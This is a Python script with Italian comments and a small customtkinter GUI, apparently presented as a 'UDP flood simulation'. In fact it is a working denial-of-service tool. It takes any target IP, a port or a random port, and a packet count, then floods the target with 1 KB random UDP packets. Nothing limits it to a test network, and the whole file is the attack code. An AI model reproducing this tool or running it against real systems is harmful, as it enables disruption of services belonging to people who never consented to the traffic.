import socket
import random
import time
import customtkinter as ctk

# Variabile per fermare l'attacco
attack_running = False

# Funzione per generare pacchetti di 1 KB
def generate_packet():
    return random._urandom(1024)  # 1024 byte (1 KB)

# Funzione per lanciare l'attacco UDP Flood
def udp_flood(target_ip, target_port, num_packets):
    global attack_running  # Usa la variabile globale per il controllo
    try:
        # Creazione del socket UDP
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        
        # Contatore pacchetti inviati
        sent_packets = 0
        
        # Aggiornamento dello stato
        status_label.configure(text=f"Inizio attacco UDP flood su {target_ip}:{target_port}", text_color="green")
        
        # Ciclo per inviare i pacchetti
        for _ in range(num_packets):
            if not attack_running:  # Verifica se l'attacco deve essere fermato
                status_label.configure(text="Attacco interrotto.", text_color="red")
                return
            
            packet = generate_packet()
            sock.sendto(packet, (target_ip, target_port))
            sent_packets += 1
            if sent_packets % 100 == 0:
                status_label.configure(text=f"{sent_packets} pacchetti inviati.", text_color="orange")
                window.update()  
            
            time.sleep(0.01)
        
        # Stato finale
        status_label.configure(text=f"\nAttacco completato. {sent_packets} pacchetti inviati al target.", text_color="blue")
    
    except Exception as e:
        status_label.configure(text=f"Errore: {e}", text_color="red")
    finally:
        sock.close()

# Funzione per generare una porta casuale
def generate_random_port():
    return random.randint(1024, 49151)

# Funzione chiamata al click del pulsante "Start"
def start_attack():
    global attack_running
    attack_running = True  # Avvia l'attacco
    target_ip = ip_entry.get()
    
    # Gestisci la porta (casuale o inserita)
    target_port = int(port_entry.get()) if not random_port_checkbox.get() else generate_random_port()

    # Numero di pacchetti
    num_packets = int(packets_entry.get())
    
    # Avvia l'attacco
    udp_flood(target_ip, target_port, num_packets)

# Funzione per fermare l'attacco
def stop_attack():
    global attack_running
    attack_running = False  # Ferma l'attacco

# Creazione della finestra principale
window = ctk.CTk()
window.title("Simulazione UDP Flood")
window.geometry("500x400")

# Titolo
title_label = ctk.CTkLabel(window, text="Simulazione UDP Flood", font=("Arial", 18))
title_label.pack(pady=20)

# IP del target
ip_label = ctk.CTkLabel(window, text="IP della macchina target:")
ip_label.pack()
ip_entry = ctk.CTkEntry(window, placeholder_text="Inserisci IP del target")
ip_entry.pack(pady=5)

# Porta del target
port_label = ctk.CTkLabel(window, text="Porta UDP della macchina target:")
port_label.pack()
port_entry = ctk.CTkEntry(window, placeholder_text="Inserisci la porta (o lascia vuoto per random)")
port_entry.pack(pady=5)

# Checkbox per selezionare una porta casuale
random_port_checkbox = ctk.CTkCheckBox(window, text="Seleziona porta casuale", variable=ctk.BooleanVar(value=False))
random_port_checkbox.pack()

# Numero di pacchetti
packets_label = ctk.CTkLabel(window, text="Numero di pacchetti da inviare:")
packets_label.pack()
packets_entry = ctk.CTkEntry(window, placeholder_text="Inserisci il numero di pacchetti")
packets_entry.pack(pady=5)

# Pulsante per avviare l'attacco
start_button = ctk.CTkButton(window, text="Avvia Attacco", command=start_attack)
start_button.pack(pady=10)

# Pulsante per fermare l'attacco
stop_button = ctk.CTkButton(window, text="Ferma Attacco", command=stop_attack)
stop_button.pack(pady=10)

# Etichetta per il feedback dello stato
status_label = ctk.CTkLabel(window, text="Pronto per avviare l'attacco.", text_color="black")
status_label.pack(pady=10)

# Avvia la finestra
window.mainloop()
